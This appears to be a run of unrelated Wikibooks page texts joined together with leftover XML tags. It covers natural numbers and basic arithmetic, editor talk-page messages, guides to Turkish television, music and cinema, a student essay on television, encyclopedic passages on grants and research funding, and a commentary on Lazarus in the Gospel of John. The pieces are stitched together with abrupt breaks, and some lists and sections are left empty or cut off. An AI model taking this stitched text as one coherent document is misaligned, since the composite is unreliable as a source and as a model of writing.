The whole numbers can be formed in many ways.  The easiest way is to use what is called an inductive definition.  This is when we define the first of a series of numbers, and then make it possible to derive any given number's successor so that given any number we can always find the next.  The first of the whole numbers is 0.  The way we can derive the next is to simply add one to the previous number.  This is easily demonstrated: 0 + 1 = 1, so zero's successor is one;  1 + 1 = 2, so one's successor is two; 2 + 1 = 3, so two's successor is three; and this can be continued &quot;''ad infinitum'',&quot; which is just a Latin phrase meaning &quot;to infinity&quot;.

==Uses==
The natural numbers are used for three main purposes: for counting, for ordering, and for defining other concepts.  Counting is the natural way to measure the quantity of a set of several discrete, individually identifiable objects.  To count a specific set of objects using the natural numbers, you must simply assign one and only one natural number to one element of the group of objects, starting with one.  To the next object, selected arbitrarily, that has not yet been assigned a number, you would assign the next number in the group of natural numbers and then proceed to move on to the next, until all of the items have been assigned a number.  (If we can never reach the end, we cannot describe the count in terms of any natural number.  There are ways of dealing with &quot;infinite&quot; sets, but for now we stick to &quot;finite&quot; sets.)  The attentive will notice that this is an inductive definition: we define the first term and come up with a way of deriving any given term's successor.  Counting sometimes goes by the fancy name &quot;enumeration.&quot;

Ordering (also called &quot;ranking&quot;) is the assignment of natural numbers to members of a group not arbitrarily, but with some property in mind.  To do this, you select the object that has the most extreme value of that property (i.e. the smallest, the smartest, the fattest, etc. . .) and assign it the natural number one, then you set it aside and move on to the remaining object with the greatest (remaining) value of that property and assign it the next natural number, in this case, two.  You then set it aside too, and proceed to the remaining object with the greatest (remaining) value of that property and assign it, once again, the next natural number, repeating this step until all objects have been ranked.  (If we are only interested in the first few rankings, we can stop before we have ranked all of a large number of objects.)  Once again, we use an inductive definition.  In most natural languages, different words are used for numbers as quantities (&quot;three&quot;) and for numbers as ranks (&quot;third&quot;).  We call the former &quot;cardinal numbers&quot; and the latter &quot;ordinal numbers,&quot; although they are both just natural numbers being applied in slightly different ways.

It should be noted that in all of the above cases zero does not come into play.  Zero is a unique case where, in the case of counting, you have not yet assigned any number to an object.  For example, if you are attempting to count the amount of apples you own, and you own no apples, then the amount you count is zero.  With ordering, the number zero is never used because if you have nothing to order, you are done before you start, and no object will ever be ranked in 0th place.

The natural numbers also play an integral part in the definition of many other mathematical concepts, including the very concept of mathematical induction we have used to define counting and ordering.  Because the procedure used on this page uses mathematical induction, in a more formal situation we must use another method to define the natural numbers, in order to avoid a &quot;circular definition&quot; (where a concept is defined in terms that depend on the concept being defined).  A [[Real_Analysis/Counting_Numbers#Peano Axioms|formal definition of natural numbers]] can be based on the &quot;successor&quot; idea.

==Properties==
One notices that the natural numbers go on forever, with any singular one of them having an infinite number of successors, as any successor has a successor, and that successor has a successor onwards to infinity.  Yet in spite of the infinite size, we can still count the numbers.  This makes the set countably infinite.  Mathematicians have created a whole set of special numbers called the cardinal numbers to describe the different sized infinities; in this case, the set of natural numbers is aleph-null sized.  This is important to remember for further studies in mathematics.

      <comment>/* Multiplication */</comment>
      <text xml:space="preserve">There are four basic ''operators'', which are used to work with numbers for uses besides counting. They are:
*+ addition
*- subtraction
*× multiplication (The symbol * is also used to multiply)
*÷ division (The symbol / is also used to divide)

== Addition ==
Addition is the summation of two numbers.&lt;!-- Actually, we can't present a strict definition not having introduced the increment (which was, in fact, introduced in the Introduction to naturals). --&gt; For example, 1 + 2 = 3.

== Subtraction ==
Subtraction is the opposite of addition. It is the taking away of one number from another. For example, 2 - 1 = 1

== Multiplication ==
Multiplication is the adding of a number a certain number of times. So 2 *1 = 2, 2 * 2 = 2 + 2 = 4, 2 * 3 = 2 + 2 + 2 = 6, etc.

== Division ==
Division is the splitting of a number into a number of equal parts. For example, 6 ÷ 2 = 3.

The number line is a one-dimensional graph to show the relative positions of numbers. As you can see, as the line goes left, the numbers become smaller; as the line goes right, the numbers become larger. The line continues ''infinitely'' (without end) in ''both directions''.

As you can see, the positive and negative numbers are of equal distance from the number zero. The distance of a number from zero is called the ''absolute value''. The absolute value of a number is always positive or zero. It is represented by two lines on the left and right of a number.

* |-5| = 5
* |0| = 0
* |5 + 3| = |8| = 8

      <text xml:space="preserve">What happens when you want to show with math that there is nothing? That is where we use zero (0). So 3 - 3 = 0. When you have no money, you have $0 (zero dollars).

So far we have learned about nine different numbers.&lt;!-- Where? --&gt; But what if we want to count higher than nine? This is where we use numbers that have more than one ''digit''.

 &lt;big&gt;'''9 + 1 = 10'''&lt;/big&gt; &lt;br /&gt;
:At first, this looks like nonsense. How can nine and one make &quot;one-zero&quot;? But the &quot;one-zero&quot; is actually a number in itself. Since there is more than one digit, all but the last digit represent numbers larger than nine. 10 can be rewritten as 1 × 10 + 0.

*  15 = 1 × 10 + 5
*  30 = 3 × 10 + 0
*  58 = 5 × 10 + 8

      <text xml:space="preserve">==Hi==
Hi, Jacobroche!  Thanks for stopping by and making some corrections to the [[Hebrew]] book.  I'm not sure why the shin &amp; sin look the same in your browser.  They look different in mine, but I'll see what I can find out.  Any more help you can contribute would be greatly appreciated.  How well do you know Hebrew?  My skills are at a very low level, but I hope to learn more by working with others on this.  Take care!  --[[User:CocoaZen|CocoaZen]] 16:36, 18 March 2007 (UTC)

==Learning through Teaching==
Well, I'm only a little ahead of you.  I can read phonetically and know some words.  So, if you see things that conflict with your books, or even basic English typos, feel free to correct them.  Also, feel free to add to the suggested lessons, lesson structure ([[Hebrew/Contents]], [[Talk:Hebrew]]) or vocabulary ([[Hebrew/Miscellaneous Vocabulary]]) that you'd like to see added.  --[[User:CocoaZen|CocoaZen]] 02:51, 20 March 2007 (UTC)</text>

==Turkic Wikibooks==
I got your message at my wikibook, and was happy to hear from you. It'll be really cool to get lot's of Turkic language books available, though I think a system more like at [http://www.tyvawiki.com Tyva Wiki] would be better. But we can start here--and you can help too! For Uzbek and Mongolian one thing that is really needed is somebody like you typing in lessons from the peace-corps manual (a public domain book). Afterwards people who know the language can easily expand it. Welcome to Wikipedia, I hope to see you around!--[[User:Uzbekscholar|Uzbekscholar]] 20:54, 18 April 2007 (UTC)

== What is Wikijunior ==

[[Wikibooks:Wikijunior:What_is_Wikijunior|What is Wikijunior]] is proposed as a policy and has been included on the [[Wikibooks:Policies_and_guidelines/Vote|Wikibooks Policies and Guidelines Voting]] page. Please take time to comment and express your opinion in the referendum. --[[User:Xixtas|&lt;span style=&quot;color:turquoise&quot;&gt;xixtas&lt;/span&gt;]] &lt;sup&gt;[[User_Talk:Xixtas|&lt;span style=&quot;color:magenta&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 02:37, 2 May 2007 (UTC)

== Deleting pages ==

G'day, I saw your comment on [[Turkish/Contents]]. If you want a page deleted from a book you are editing, add the {{tl|delete}} tag at the top of the page, explaining why the page should be deleted - e.g. &lt;nowiki&gt;{{delete|Page is no longer required, because ...}}&lt;/nowiki&gt;. An administrator will sort it out sooner or later. [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 11:22, 17 July 2007 (UTC)
:No worries, glad to help. If you have further questions, just drop me a note on my talk page, or ask the world in general on one of the [[WB:SL|Staff lounge]] pages. cheers, [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 14:55, 17 July 2007 (UTC)

      <text xml:space="preserve">Learning Turkish, as any other language, is a matter of intense contact, interest and practice of the spoken and written language. The Turkish media may become an endless source for practising and improving your Turkish, to explore the Turkish culture or other interests (history, politics, music, ...).

Below you find real examples from the Turkish television. These are only small bits, not always complete sentences.

The following examples may help you to learn and understand the Turkish used in the media. Please feel free to edit the content, reorganize it, add your words and sentences. Correction of spelling or translation errors is also welcome.

With your contribution this wikibook will, inşallah, grow over time.

      <text xml:space="preserve">There's a lot of Turkish TV out there, and with that comes the golden opportunity of enhancing your Turkish, exposing yourself to Turkish culture and learning more colloquial language.

To further your Turkish, you will want to watch:

*[http://www.trt.net.tr TRT] - the state owned broadcaster of Turkey
*[http://www.startv.com.tr Star TV] - the first private channnel of Turkey
*[http://www.showtvnet.com Show TV] - very entertaining, you'll find lots of '''dizi'''s (soap operas), dubbed films, and shows here
*[http://www.cnnturk.com CNN Türk] - you can probably guess what that is!
*[http://www.ntvmsnbc.com/news/default.asp?cp1=1 NTV Türkiye] - Turkey's news channel
*[http://www.kanald.com.tr Kanal D] - another major Turkish channel
*[http://www.mtv.com.tr MTV Türkiye] - You can guess what this is, too!
*[http://www.atv.com.tr ATV Türkiye] - another major Turkish channel
*[http://www.fox.com.tr Fox Türkiye] - and you can guess this one, aswell!
*[http://www.kraltv.com.tr/ Kral TV] - one of Turkey's many music channels, but plays exclusively Turkish music

For satellite frequencies, [http://www.lyngsat.com/turk42.html click here]! You could also opt to subscribe to [[w:Digiturk|Digitürk]], but I think in your case it would be a waste of money.

      <comment>/* Turkish folk music */</comment>
      <text xml:space="preserve">{{wikipedia|Music of Turkey}}
Turkish music is very diverse, and as of today, both Turkish popular and folk music is of critical acclaim. In this page you will learn about the most popular Turkish artists of each genre.

As modern Turkish music, like American/English/Australian/etc. music, is constantly changing (i.e. what is considered &quot;in&quot; obviously changes over time), I would recommend that you not only look at this page, but also watch some Turkish music channels regularly (see [[Turkish/Contents/Ways of enhancing your Turkish/Turkish Satellite Television|Turkish Satellite Television]]), because I, unfortunately, lack the patience to constantly update this page regularly.

By the way, it might sound weird because it's in another language, but just try to adjust. Turkify yourself. Go wild!

==Pop==
{{wikipedia|Turkish pop music}}
These days, it seems very easy to get a record deal in Turkey. There are many artists whose songs are all similar and have mediocre talent.

The list of artists below are a few of those who are the best in the Turkish music industry because they stand out from the others and, of course, make good music:

*'''[[w:Tarkan|Tarkan]]''' (arguably the most popular male pop artist)
**'''Listen to:'''
***''Şımarık'' (his defining song)
***''Dudu'' - (Wife)
***''Bounce'' (an English song)

**'''Listen to:'''

***''Here I Am''
***''Leave''

**'''Listen to:'''
***''Vay''
***''Şinanay''
*'''[[w:Ajda Pekkan|Ajda Pekkan]]'''

==Rock==
{{wikipedia|Anatolian rock}}
A lot of Turkish rock music tends to be really dark, but I suppose those artists tend to be the successful ones. The only exceptions I can actually think of are:
*'''[[w:Barış Manço|Barış Manço]]''', one of Turkey's most famous people, and had a large following in Japan.
*'''[[w:Athena|Athena]]''', a very popular ska-punk band
Everyone else makes at least relatively dark music.

**'''Listen to:'''
***'''Bir Kadın Çizeceksin'''
***'''Bitti Rüya''' - (The Dream Has Ended)
***'''Dursun Zaman''' - (Time Should Stop) (with '''[[w:Göksel|Göksel]]''')
*'''[[w:Şebnem Ferah|Şebnem Ferah]]
**'''Listen to:'''
***'''Sil Baştan'''
***'''Ben Şarkımı Söylerken''' - (While I'm Singing My Song)
***'''Can Kırıkları''' - (Broken [pieces] of Life/Soul)
***'''Bırak Kadının Olayım''' - (Let Me Be Your Woman)
***'''Babam Oğlum''' - (My Father &amp; My Son)

***'''Deli''' - (Mad)
*'''[[w:Mezarkabul|Pentagram]]
*'''[[w:Çilekeş|Çilekeş]]

==Rap / Hip-Hop==
{{wikipedia|Turkish hip-hop}}
Hip-hop and rap in Turkey is quickly flourishing, and in the list below you will find Turkey's most popular hip-hop / rap artists.
*'''İsmail YK'''
*'''[[w:Ceza|Ceza]]'''
*'''Nefret'''
*'''[[w:Sagopa Kajmer|Sagopa Kajmer]]'''

==Arabesque==
{{wikipedia|Arabesque music}}
Arabesque music is very popular in Turkey. Here is a list of the most popular Arabesque singers.
*'''[[w:Müslüm Gürses|Müslüm Gürses]]
*'''[[w:Ebru Gündeş|Ebru Gündeş]]
*'''[[w:Orhan Gencebay|Orhan Gencebay]]

==Turkish classical music==
{{wikipedia|Ottoman classical music}}
Turkish classical music isn't like the classical music in the west. It is very popular and if you're not a fan of Western classical music you might like Turkish classical music. Here are some examples of popular Turkish classical musicians:
*'''[[w:Zeki Müren|Zeki Müren]]
*'''[[w:Bülent Ersoy|Bülent Ersoy]]
*'''[[w:Emel Sayın|Emel Sayın]]

      <text xml:space="preserve">{{wikipedia|Cinema of Turkey}}
There are two ways in which you will be able to have access Turkish movies. If you live somewhere with a large Turkish diaspora (Germany, any major European city, NY or LA) then you will almost definitely have access to a cinema screening a Turkish movie (the list of places is kind of like a sliding scale, starting from &quot;definitely&quot;, to &quot;maybe&quot;).

You could also buy Turkish movies on DVD from a local Turkish supermarket (there are lots around Western Europe) or online. This would actually be a better idea because you could opt to put on English subtitles to make actually understanding the movie a lot easier.

Here is a list of some of the best Turkish movies out there

*'''[[w:Babam ve Oğlum|Babam ve Oğlum]]''' - i.e.: ''My father and My Son''. According to an Istanbul poll, 96% of viewers cried at least once during the movie.
*'''[[w:G.O.R.A.|G.O.R.A.]]''' - a successful Turkish comedy parodying many recent sci-fi movies.
*'''Sınav''' - i.e.: ''Exam''. A teen movie starring Jean Claude Van Damme, criticising the Turkish university entrance examination. ''See [[w:ÖSS|ÖSS]]''
*'''[[w:Kurtlar Vadisi Irak|Kurtlar Vadisi Irak]]''' - i.e.:''The Valley of the Wolves Iraq''. A successful spinoff of the very controversial yet extremely popular Turkish series ''(See [[w:Valley of the Wolves|Valley of the Wolves]])'' criticising the Iraq War (through bizarre scenarios like human organ harvesting for rich westerners), this has been the highest grossing Turkish movie of all time. Starring Billy Zane.
*'''[[w:Uzak|Uzak]]''' - i.e.: ''Distant''. An award-winning Turkish movie, winner of the 2003 Grand Prix award at the Cannes Film Festival.
*'''[[w:Vizontele|Vizontele]]'''
*'''[[w:Hunting Season|Av Mevsimi]]'''
*'''[[w:Veda|Veda]]'''

      <text xml:space="preserve">So far, every number we have discussed has been an ''integer''. What if something costs between two and three dollars? This is when ''decimals'' are used. A ''decimal point'', which looks like a full stop (or period), separates the integral part of the number from the decimal part. Instead of each number being ten times as large, they become ten times as small.

*1.5 : 1 + (5 ÷ 10)
*3.85 : 3 + (8 ÷ 10 + 5 ÷ 100)

      <text xml:space="preserve">There are a number of ways to compare two arithmetic ''expressions''. The first one can either be:
*equal to the second (=)
*greater than the second (&gt;)
*less than the second (&lt;)
*greater than '''&lt;u&gt;or&lt;/u&gt;''' equal to the second (≥)
*less than or equal to the second (≤)

Examples:

:5&gt;2 (reads: &quot;Five is greater than Two&quot;)&lt;br /&gt;
:2&lt;5 (reads: &quot;Two is less than Five&quot;)&lt;br /&gt;
:7=7 (reads: &quot;Seven is equal to Seven&quot;)&lt;br /&gt;
:a ≥ b (reads: &quot;A is greater than '''or''' equal to B&quot;. This means A could be equal to B '''or''' greater than B.)&lt;br /&gt;
:a ≤ b (reads: &quot;A is less than '''or''' equal to B&quot;. This means A could be equal to B '''or''' less than B.) 
*These are very important to understand before diving into solving equations with these symbols.

      <text xml:space="preserve">==How has the invention and use of television affected our everyday lives?==

The television is probably the most important item contained within the American home.  According to the A.C. Nielsen Co., the average American watches more than 4 hours of TV each [http://www.csun.edu/science/health/docs/tv&amp;health.html day].  What did Americans do before the TV existed?  Where did they get their news?  How were they entertained?  I cannot answer these questions using first hand experience.  The young adults of my generation grew up in an era where television was not a novelty, but a reality.  I will do my best to give a personal description of how television has affected my everyday life.

Considering that during no part of my existence has my life been completely void of television, it’s hard to define the overall effect it has had on me.  My experience, however, has shown me that through its evolution and increasing presence within my lifetime that it follows the general theme of technological changes.  The circular pattern is continuous, flowing through the altering of physical environment, to the altering of ideas about the way the world works, and finally to the altering of behavior.

Television has influenced my social life in college in a profound way. Through the communal television in the lounge, I have met some of the most interesting people. Without this communal space and this common interest, it would have been difficult to relate to these people, and find a common ground. Commercial television is very confined by conventions, and everyone indirectly needs to adhere to these conventions, and this is why television has become such a common ground for the people that live in this dorm as well as everyone else.  The discussions that are built from watching these shows have bonded us in ways that other conversational elements could not. Unfortunately we have not all read the same books or seen the same plays, and the most common ground we have is in television, so we fully recognize this and act on it. Without this common element I would hesitate to venture from my room. Television is a big part of our society's social interaction today.

Beginning with physical environment, the television in my earlier years could be found solely in the living room.  As I grew, so did the amount of televisions we owned, and their size. We settled finally with seven televisions and one projector with television capabilities.  This trend could be seen across America, and it certainly followed me to college.  Each of my four roommates and I have our own television, with a communal one in our living room and in the lounge.  Its evolution into an essential room furnishing caused changing ideas about how the world works.

The notion that each person must have his or her own personal television is an apparent change in ideas from even a decade earlier.  This belief was paralleled by another, which assumed that each person also must have his or her own personal channel.  While not meant literally, highly differentiated channels were undoubtedly being introduced at a fast rate. A channel was available for virtually everyone: Cartoon Network, Nickelodeon, the Disney Channel, MTV, ESPN, BET, Spike and E, the list could go on virtually forever.  As I grew through the “channel boom” and adopted a new favorite each year, I typically found the shows I watched to influence my behavior in that era.

Because most of my friends also watched the same channels I did, we were all influenced by the characters.  Noticeable changes such as dress and speech were probably most prevalent, but in sum our entire behavior was probably affected.  The argument that violence and sexual promiscuity found on television causes children and teenagers to act in unfavorable ways supports this assumption.

From altered physical environment to altered world outlooks to altered behavior, the television has had a larger impact than I can begin to describe.  This continuous pattern restarts and continues with no end in sight, as we currently enter the age of television “On Demand.”

==Grants==
Grants are funds given to tax-exempt nonprofit organizations or local governments by foundations, corporations, governments, small business and individuals. Most grants are made to fund a specific project and require some level of reporting. The process involves an applicant submitting a proposal to a potential funder, either on the applicant's own initiative or in response to a Request for Proposals from the funder. Other grants can be given to individuals, such as victims of natural disasters or individuals who seek to open a small business.

Other grants include intergovernmental grants which are used to correct fiscal imbalances between different levels of government. Many federations use these grants to correct imbalances between taxing and spending across different levels of government. Examples include the US, Australia and Kenya.

Most often, grants are issued by the government to students through attending post-secondary education institutions. In certain cases, a part of a government loan is issued as a grant, particularly pertaining to promising students seeking financial support for continuing their educations.

== Block grants ==
In a federal system of government, a block grant is a large sum of money granted by the national government to a regional government with only general provisions as to the way it is to be spent. This can be contrasted with a categorical grant which has more strict and specific provisions on the way it is to be spent.

An advantage of block grants is that they allow regional governments to experiment with different ways of spending money with the same goal in mind, though it is very difficult to compare the results of such spending and reach a conclusion. A disadvantage is that the regional governments might be able to use the money if they collected it through their own taxation systems and spent it without any restrictions from above.

Since the 1980s, the United States government has provided vast sums of money through block grants, under a policy that has come to be known as &quot;devolutionary&quot; or &quot;new federalism.&quot;

According to the General Accounting Office, from 1980 to 2001 the number of federal block grant programs went from 450 to 700. The grants are aimed at a wide range of activities from education, to healthcare, to transportation, to housing, to counterterrorism.

In the United States, the formulas for how much money states receive favor small states. Most grant programs have a minimum amount per state - usually 0.5 % or 0.75 %.

For instance, in 2003, under the State Homeland Security Grant Programs and Critical Infrastructure Protection Grants, Wyoming, the least populous state, received $17.5 million and California, the most populous state, received $164 million. In 2004 FY2004 Wyoming is guaranteed to receive a minimum of $15 million and California, the most populated state, $133 million. Wyoming receives $35.3 per person, California receives $ 4.7 per person.

Similar patterns exist for other block grant formulas. An analysis exists in the book Sizing Up the Senate.

Major criticisms of block grants are that:

* the award process can be manipulated so that grants can be distributed to reward the federal administration's own party (by favoring states with governors of that party, for example);
* at the local level, the same sort of partisan favoritism may occur when the state distributes the funds to local government units;
* dispersing the funds through state or local governments makes federal oversight of their proper use very difficult.

== Categorical grants ==
During the development of the interstate highway system, congressional grants provided roughly 90% of the funding. These types of federal grants are called categorical grants because the national government determines the purposes, or categories, for which the money should be used. Categorical grants may be spent only for narrowly defined purposes and recipients often must match a portion of the federal funds. 33% of categorical grants are considered to be formula grants. See: Head Start, Urban Forestry Assistance, Asbestos School Hazards Abatement. About 90% of federal aid dollars are spent for categorical grants.

Categorical grants in the 1960s were meant to help the states perform their traditional functions.

Project grants required state and local governments to submit proposals to federal agencies. Project grants encourage competition between groups that want the grant. There is also an emphasis on merit, as in the case of grants obtained by university professors.

Formula grants used a formula, composed of such elements as need and state and local capacities, to distribute funds.

==Federal grants==
In the United States Federal grants are economic aid issued by the United States government out of the general federal revenue. Grants may also be issued by private non-profit organizations such as foundations, not-for-profit corporations or charitable trusts which are all collectively referred to as charities. Outside the United States grants, subventions or subsidies are used to in similar fashion by government or private charities to subsidize programs and projects that fit within the funding criteria of the grant-giving entity or donor. Grants can be unrestricted, to be used by the recipient in any fashion within the perimeter of the recipient organization's activities or they may be restricted to a specific purpose by the benefactor.

== Research ==
Research is an active, diligent, and systematic process of inquiry aimed at discovering, interpreting, and revising facts. This intellectual investigation produces a greater knowledge of events, behaviors, theories, and laws and makes practical applications possible. The term research is also used to describe an entire collection of information about a particular subject, and is usually associated with the output of science and the scientific method. The word research derives from the French recherche, from rechercher, to search closely where &quot;chercher&quot; means &quot;to search&quot; (see French language); its literal meaning is 'to investigate thoroughly'. Research is funded by public authorities, by charitable organisations and by private groups, including many companies.

Basic research (also called fundamental or pure research) has as its primary objective the advancement of knowledge and the theoretical understanding of the relations among variables (see statistics). It is exploratory and often driven by the researcher’s curiosity, interest, or hunch. It is conducted without any practical end in mind, although it may have unexpected results pointing to practical applications. The terms “basic” or “fundamental” indicate that, through theory generation, basic research provides the foundation for further, sometimes applied research. As there is no guarantee of short-term practical gain, researchers may find it difficult to obtain funding for basic research. Research is a subset of invention.

Examples of questions asked in basic research:

* Does string theory provide physics with a grand unification theory?
* Which aspects of genomes explain organismal complexity?
* Is it possible to prove or disprove Goldbach's conjecture? (i.e. that every even integer greater than 2 can be written as the sum of two, not necessarily distinct primes)

Traditionally, basic research was considered as an activity that preceded applied research, which in turn preceded development into practical applications. Recently, these distinctions have become much less clear-cut, and it is sometimes the case that all stages will intermix. This is particularly the case in fields such as biotechnology and electronics, where fundamental discoveries may be made alongside work intended to develop new products, and in areas where public and private sector partners collaborate in order to develop greater insight into key areas of interest. For this reason, some now prefer the term frontier research.

Academic publishing describes a system that is necessary in order for academic scholars to peer review the work and make it available for a wider audience. The 'system', which is probably disorganised enough not to merit the title, varies widely by field, and is also always changing, if often slowly. Most academic work is published in journal article or book form. In publishing, STM publishing is an abbreviation for academic publications in science, technology, and medicine.

Most established academic fields have their own journals and other outlets for publication, though many academic journals are somewhat interdisciplinary, and publish work from several distinct fields or subfields. The kinds of publications that are accepted as contributions of knowledge or research vary greatly between fields.

Academic publishing is undergoing major changes, emerging from the transition from the print to the electronic format. Business models are different in the electronic environment. Since about the early 1990s, licensing of electronic resources, particularly journals, was very common. Presently, a major trend, particularly with respect to scholarly journals, is open access. There are two main forms of open access: open access publishing, in which the articles or the whole journal is freely available from the time of publication, and self-archiving, where the author makes a copy of their own work freely available on the web.

Most funding for scientific research comes from two major sources, corporations (through research and development departments) and government (primarily through universities and in some cases through military contractors). Many senior researchers (such as group leaders) spend more than a trivial amount of their time applying for grants for research funds. These grants are necessary not only for researchers to carry out their research, but also as a source of merit. Some faculty positions require that the holder has received grants from certain institutions, such as the US National Institutes of Health (NIH). Government-sponsored grants (e.g. from the NIH, the National Health Service in Britain or any of the European research councils) generally have a high status.

== Research funding ==
Research funding is a term generally covering any funding for scientific research, in the areas of both &quot;hard&quot; science and technology, and social science. The term often connotes funding obtained through a competitive process, in which potential research projects are evaluated and only the most promising receive funding. Such processes, which are run by government, corporations or foundations, allocate scarce funds. Total research funding in most developed countries is between 1.5% and 3% of GDP; Sweden is the only country to exceed 4%. [1]

Most research funding comes from two major sources, corporations (through research and development departments) and government (primarily carried out through universities and specialised government agencies). Some small amounts of scientific research are carried out (or funded) by charitable foundations, especially in relation to developing cures for diseases such as cancer, malaria and AIDS.

Government funding for medical research amounts to approximately 36% in the U.S. The government funding proportion in certain industries is higher, and it dominates research in social science and humanities. Similarly, with some exceptions (e.g. biotechnology) government provides the bulk of the funds for basic scientific research. In commercial research and development, all but the most research-oriented corporations focus more heavily on near-term commercialisation possibilities than &quot;blue-sky&quot; ideas or technologies (such as nuclear fusion). One of the most famous exceptions is the innovation-favouring environment of the 1970s at Xerox Parc, where various ideas including the computer mouse were developed. Similarly, IBM's research into quantum computing has been going on for some years, and it will likely be some years more before it yields commercialisable technology.

Many governments of developed countries provide considerable funds (primarily to universities) for scientific research (in fields such as physics and geology) as well as social science research (in fields such as economics and history). Much of this is not intended to provide concrete results that may be commercialisable, although research in scientific fields may lead to results that have such potential. Most university research is aimed at gaining publication in peer reviewed academic journals.

Government funding for research into defense-related technological research has historically been significant. Some of this takes place in public research institutions such as DARPA, whilst much else is carried out by major defense contractors in expectation of being able to sell the results to the government (so is funded privately, but on the basis of implicit or explicit agreement of costs being recouped from the government).

Inventions &quot;conceived or actually reduced to practice&quot; in the performance of government-funded research may be subject to the Bayh-Dole Act.

In the eighteenth and nineteenth centuries, as the pace of technological progress increased before and during the industrial revolution, most scientific and technological research was carried out by individual inventors using their own funds. A system of patents was developed to allow inventors a period of time (often twenty years) to commercialise their inventions and recoup a profit, although in practice many found this difficult. The talents of an inventor are not those of a businessman, and there are many examples of inventors (e.g. Charles Goodyear) making rather little money from their work whilst others were able to market it.

In the twentieth century, scientific and technological research became increasingly systematised, as corporations developed, and discovered that continuous investment in research and development could be a key element of success in a competitive strategy. It remained the case, however, that imitation by competitors - circumventing or simply flouting patents, especially those registered abroad - was often just as successful a strategy for companies focused on innovation in matters of organisation and production technique, or even in marketing. A classic example is that of Wilkinson Sword and Gillette in the disposable razor market, where the former has typically had the technological edge, and the latter the commercial one.

Government-funded research into such matters as the nature of quantum mechanics, the existence of water on Mars, or the mechanics of the interaction between milk and cornflakes[citation needed], is considered by some to be a waste of money which might be better spent elsewhere (for example on education), or even on tax cuts.

Since the value of such knowledge is often difficult or impossible to judge, and no commercial benefit (at least on any relevant time horizon) can be derived, a frequent apparently common-sense position is that therefore such knowledge should not be pursued at public expense. However, even in the most theoretical of fields, it is often difficult to determine in advance where research may lead.

For example, decades of research into quantum mechanics have made possible work on quantum computing, which is now expected to be an even greater leap forward in computing technology than the development of the microchip, which in some areas is beginning to reach the limits of what is physically possible with this technology. It remains to be seen whether the inherent technical difficulties in quantum computing actually allow for a widespread application of this technology.

A characteristic of privately funded research is that it is almost always profit-oriented. In other words, private corporations tend to devote a relatively small investment to fund research into a field that shows little prospect of being profitable in the near future, even if such research could lead to highly beneficial results (for example, drug companies may not want to invest in finding the cure for a disease if most of the people affected by that disease are too poor to be able to afford such a cure). Some protest that cures and treatments for rare diseases are not pursued due to the lack of profit potential. Supporters of commercially funded research make a utilitarian argument, saying that the fact that profit potential directs investment in treatment for diseases that afflict the many individuals rather than few individuals is a good thing, since it results in alleviating the greater amount of human suffering.

An often-quoted example used to illustrate the difference in efficiency between government-funded and privately funded research projects is the quest of mapping the human genome. The U.S. government was funding such a mission, called the Human Genome Project, while at the same time the quest was being pursued separately with private venture capital by Celera Genomics. Celera Genomics used a newer, albeit riskier technique and proceeded at a faster pace and at a fraction of the cost of the tax-funded project (approximately $3 billion of taxpayer dollars versus about $300 million of private funding). Some HGP researchers claimed Celera's method of genome sequencing &quot;would not work,&quot; however that project eventually adopted some of Celera's methods.

Occasionally some research is politically controversial; in the US, there have been cases of controversy over research into sexually transmitted disease, and restrictions on federally funded research into stem cells.

A 2005 study in the journal Nature surveyed 3247 US researchers who were all publicly funded (by the National Institutes of Health). Out of the scientists questioned, 15.5% admitted to altering design, methodology or results of their studies due to pressure of an external funding source. In a contemporary study published in the New England Journal of Medicine, a similar proportion of the 107 medical research institutions questioned were willing to allow pharmaceutical companies sponsoring research to alter manuscripts according to their interests before they were submitted for publication.

      <text xml:space="preserve">'''Similarities and Differences with the Gospel of Luke'''  
It is interesting that both Luke and John contain stories that have a man named Lazarus.  D. Moody Smith, in his commentary on the Gospel of John explains how the name Lazarus is used in Luke:  &quot;The rich man, condemned to torment in Hades finally asks Father Abraham to send Lazarus, who reposed in Abraham's bosom, to warn his five brothers to repent and thus avoid his own fate.  But Abraham refuses, saying that if the brothers do not attend to Moses and the prophets they will remain unconvinced even if someone (i.e. Lazarus) rises from the dead&quot; (Smith 217).  The difference between the Lukan story that uses the name Lazarus and Chapter 11 in John is that Lazarus actually rises from the dead in John.  Because of the similarities between the two Gospels, it is possible that the Lukan story influenced the Johannine story, or the other way around.  The beginning of Chapter 11 in John is also potentially confusing in relationship to Luke; Mary is first introduced by referring to an event that first &quot;occurs&quot; in John 12.  A similar story-telling tactic (which could also, perhaps, be called a &quot;flaw&quot;) is used in Luke, in 7:36-50.  It is perplexing that in Luke 10, &quot;Mary listened at Jesus' feet while Martha worked.&quot;  Yet in John 12, &quot;Martha will serve while Mary annoints Jesus' feet&quot; (Smith 218).  It is a possibility that John 11 may be clarifying the village of Mary and Martha that Luke discusses in Chapter 10.  If this is the case, though, why does the author of John refer to Mary by using the event in John 12 as opposed to where Mary is introduced in Luke?

'''Jesus' Relationship with Lazarus and His Sisters'''
John 11: 3 states, &quot;So the sisters sent word to him saying, 'Master, the one you love is ill.'&quot;  John 11: 5 states, &quot;Now Jesus loved Martha and her sister and Lazarus.&quot;  Both of these verses point to the fact that Jesus loved Lazarus, Mary, and Martha.  The Greek verb meaning friendship is used to describe both Jesus' relationship with Lazarus and Lazarus' sisters in John 11, as well as in John 15 to describe Jesus' relationship with his followers.  At the same time, the word that means self-giving love is used interchangeably with the Greek word for friendship.  Therefore, are Mary, Martha, and Lazarus Jesus' friends or just followers?  It can be difficult to conceive Jesus as having &quot;personal friends&quot; (Smith 218) along with followers.  Yet the language in this particular chapter seems to point to both Jesus' personal friendship and a &quot;follower&quot; type relationship with Mary, Martha, and Lazarus.      


'''&quot;Jesus Wept.&quot;'''

Most people know this famous phrase because it is the shortest verse in the Bible (it has also been argued that Job 3:2 &quot;He said&quot; is actually the shortest verse). However, even though it is small, this phrase has powerful meaning. Many have never really analyzed what Jesus was actually weeping over. To the surprise of some, there are several theories that have tried to explain just that. 

